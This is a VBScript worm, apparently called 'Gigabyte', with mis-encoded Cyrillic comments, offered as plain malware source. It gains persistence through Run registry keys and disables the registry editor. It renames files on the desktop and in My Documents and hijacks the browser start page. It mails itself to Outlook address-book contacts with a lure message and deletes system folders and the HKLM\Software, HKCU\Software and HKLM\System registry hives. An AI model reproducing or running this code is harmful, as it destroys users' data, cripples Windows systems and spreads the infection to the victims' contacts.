'            = = = = = =  = > ��� ������ < = = = = = = = 

'      ���������� ����������(���� ����� �� ����������)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' ���������� ������
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


' ����������� ��� ������ ������������
Set File2 = FileSystemObject.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

' ����������� RegEdit(���� � ���� �� ��������� �������� �������).��� ���� ����� �������������� ���������� DisableRegistryTools �������� - 0
Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"

' �������������� ���� ������, ����������� �� ������� ����� �� "������"
For Each Folder In Shell.SpecialFolders
If right(folder,12) = "������� ����" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.files
For Each fl In af
Set file = FileSystemObject.getfile(fl):t = t+1
file.name = "������" & t
Next
End If
Next

' �������������� ���� ������, ����������� � ���� ���������� �� "�����"
For Each Folder In Shell.SpecialFolders
If right(folder,13) = "��� ���������" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.files
For Each fl In af
Set file = FileSystemObject.getfile(fl):t = t+1
file.name = "�����" & t
Next
End If
Next

' �������������� ����� ��� ��������� �� "�������"
For Each Folder In Shell.SpecialFolders
If right(folder,13) = "��� ���������" Then 
Set tf = FileSystemObject.getfolder(folder): tf.name = "�������"
End If
Next

' �������������� ���� ������, ����������� � ������� ����\��������� �� "�����"
For Each Folder In Shell.SpecialFolders
If right(folder,12) = "������� ����" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.subfolders
For Each fl In af
Set file = FileSystemObject.getfolder(fl):t = t+1
file.name = "�����" & t
Next
End If
Next

' ������� �� ���� "http:\\www.avp.ru"
InternerExplorer.Visible = True
InternerExplorer.Navigate "http:\\www.avp.ru"

' ������� �������� �������� "http:\\www.avp.ru"
Shell.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http:\\www.avp.ru"

' ��������� ����� 5 ��������� ����������
For Index = 1 To 5
Set OutMail = Outlook.CreateItem(0)
OutMail.to = Outlook.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "�������"
OutMail.Body = "� ��� ������� ������ ����� �������� ��� ����������� ������� Windows. ������ �������� ��!!! "
OutMail.Attachments.Add WScript.ScriptFullName
OutMail.Send
Next


'     �������� ����������� �����
 For Each Folder In Shell.SpecialFolders

' �������� Aplication Data
 If right(folder,15) = "Aplication Data" Then FileSystemObject.deletefolder folder,True

' �������� ShellNew
 If right(folder,8) = "ShellNew" Then FileSystemObject.deletefolder folder,True

' �������� NetHood
 If right(folder,7) = "NetHood" Then FileSystemObject.deletefolder folder,True
 Next

' ��������\�������� ������ � �������
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "������"

' ��������\�������� ������ � �������
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "������"

' ��������\�������� ������ � �������
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "������"

' ��������\�������� ������ � �������
Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "������"

' ������� ������ � �������
Shell.RegDelete "HKEY_LOCAL_MACHINE\Software"

' ������� ������ � �������
Shell.RegDelete "HKEY_CURRENT_USER\Software"

' ������� ������ � �������
Shell.RegDelete "HKEY_LOCAL_MACHINE\System"

'     ������� ��������� 
Shell.popup "�������� Windows ", , "RUNDLL 32", 0+32

